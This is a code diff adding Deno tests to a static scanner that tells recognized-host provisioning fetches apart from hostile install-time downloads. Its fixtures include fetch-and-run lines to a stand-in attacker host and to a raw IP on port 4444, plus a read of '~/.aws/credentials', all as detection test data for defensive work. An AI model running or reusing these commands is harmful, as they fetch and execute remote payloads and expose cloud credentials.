@@ -247,6 +247,100 @@ Deno.test("a doc mention alongside real code: code still trips the signal", () =
   assertEquals(result.severityHint, "high");
 });
 
+// --- Provisioning-fetch vs. confirmed-attack distinction ---------------------
+// A BUILD/PROVISION-time `curl|wget` fetch-and-run to a recognized software-
+// distribution host, with no credential access in the same file, is a
+// supply-chain CAUTION — mirroring the dynamic sandbox's own phase-aware
+// classification (assemble-forensics.py). It must not, on its own, trip the
+// hard `installTimeNetwork` escalation trigger or the "medium" severity band.
+// A fetch to an unrecognized host, or one alongside credential access, MUST
+// still keep full weight — this narrows one false-positive, not real attacks.
+
+Deno.test("infra-provisioning fetch to a recognized host (docker) is a caution, not installTimeNetwork", () => {
+  // Arrange — a real shape from this repo's own sandbox/ setup scripts.
+  const provision = file(
+    "sandbox/golden-image/startup-provision.sh",
+    "#!/usr/bin/env bash\nset -euo pipefail\ncurl -fsSL https://get.docker.com | sh\n",
+  );
+
+  // Act
+  const result = staticScan([provision]);
+
+  // Assert — surfaced, but not a hard escalation trigger.
+  assertEquals(result.installTimeNetwork, false, "a recognized-host provisioning fetch must not set installTimeNetwork");
+  assertEquals(result.signals.network, true, "the fetch is still a real network signal");
+  assertEquals(result.severityHint, "low", "recognized-host provisioning alone must not reach medium/high");
+  assert(
+    result.flaggedRegions.some((r) => /recognized software-distribution host \(get\.docker\.com\)/.test(r.reason)),
+    "the provisioning fetch must be surfaced as a region naming the recognized host",
+  );
+});
+
+Deno.test("shell fetch to an UNRECOGNIZED host in an install script still sets installTimeNetwork (regression guard)", () => {
+  // Arrange — same shape, but the host is not a known distribution point.
+  const attack = file(
+    "install.sh",
+    "#!/usr/bin/env bash\ncurl -fsSL https://payload.evil-c2.example/x | bash\n",
+  );
+
+  // Act
+  const result = staticScan([attack]);
+
+  // Assert — MUST keep full weight; the fix narrows one false-positive, not attacks.
+  assertEquals(result.installTimeNetwork, true, "an unrecognized-host install-time fetch must still set installTimeNetwork");
+  assertEquals(result.severityHint, "medium");
+  assert(
+    result.flaggedRegions.some((r) => /unrecognized host \(payload\.evil-c2\.example\)/.test(r.reason)),
+    "the unrecognized-host fetch must be surfaced plainly as such",
+  );
+});
+
+Deno.test("a recognized-host fetch ALONGSIDE credential access in the same file still sets installTimeNetwork (no credential involvement required)", () => {
+  // Arrange — the recognized host alone is not enough to downgrade if the same
+  // file also reads a credential path (mirrors the dynamic path's "no credential
+  // involvement" condition).
+  const mixed = file(
+    "setup.sh",
+    "#!/usr/bin/env bash\ncat ~/.aws/credentials\ncurl -fsSL https://github.com/foo/bar/releases/download/v1/tool.sh | bash\n",
+  );
+
+  // Act
+  const result = staticScan([mixed]);
+
+  // Assert
+  assertEquals(result.signals.credAccess, true);
+  assertEquals(result.installTimeNetwork, true, "credential access in the same file must negate the recognized-host downgrade");
+  assertEquals(result.severityHint, "high", "credAccess alone already drives high severity");
+});
+
+Deno.test("a non-install-context file with a recognized-host curl fetch never sets installTimeNetwork regardless", () => {
+  // Arrange — the same fetch, but not in an install/provisioning-shaped file at all.
+  const doc = file(
+    "scripts/fetch-docs.py",
+    "import subprocess\nsubprocess.run(['curl', '-fsSL', 'https://github.com/foo/bar'])\n",
+  );
+
+  // Act
+  const result = staticScan([doc]);
+
+  // Assert
+  assertEquals(result.installTimeNetwork, false);
+});
+
+Deno.test("hardcoded IP literal in an install script keeps full weight even with no curl match (unaffected by the host allowlist)", () => {
+  // Arrange — a hardcoded IP is never a "recognized software-distribution host"
+  // shape; the allowlist carve-out must not touch this pattern at all.
+  const suspicious = file("bootstrap.sh", "curl http://203.0.113.9:4444/stage2.sh | bash\n");
+
+  // Act
+  const result = staticScan([suspicious]);
+
+  // Assert — this matches BOTH the hardcoded-IP-URL pattern (always full weight)
+  // and the shell-fetch pattern (host is an IP literal, never in the allowlist).
+  assertEquals(result.installTimeNetwork, true, "a hardcoded-IP fetch in an install script must keep full weight");
+  assertEquals(result.severityHint, "medium");
+});
+
 Deno.test("embedded-secret / network literals in docs are prose too (systemic doc-vs-code fix)", () => {
   // Arrange — a README documenting an example AWS key format and an example IP.
   // These are documentation, not a committed live secret or a real network call.
